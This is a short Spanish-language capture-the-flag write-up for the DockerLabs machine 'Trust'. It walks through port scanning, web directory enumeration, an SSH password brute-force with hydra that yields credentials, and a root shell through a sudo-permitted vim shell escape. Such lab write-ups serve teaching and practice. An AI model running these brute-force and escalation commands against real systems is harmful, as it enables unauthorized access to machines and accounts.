---
layout: writeup
title: "Trust"
platform: dockerlabs
difficulty: facil
os: linux
date: 2026-04-05
tags: [ssh, brute-force, sudo, privesc]
description: "Máquina Linux sencilla. Fuerza bruta SSH y escalada de privilegios via sudo mal configurado."
---

## Reconocimiento

```bash
nmap -sV -sC -p- --min-rate 5000 172.17.0.2
```

Puertos abiertos: 22 (SSH), 80 (HTTP).

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

Encontramos `/secret.php` con un nombre de usuario: `mario`.

## Fuerza Bruta SSH

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Credenciales válidas: `mario:chocolate`.

## Acceso y Escalada

```bash
ssh mario@172.17.0.2
sudo -l
```

El usuario puede ejecutar `/usr/bin/vim` como root:

```bash
sudo vim -c ':!/bin/bash'
```

```
root@trust:/# cat /root/root.txt
```
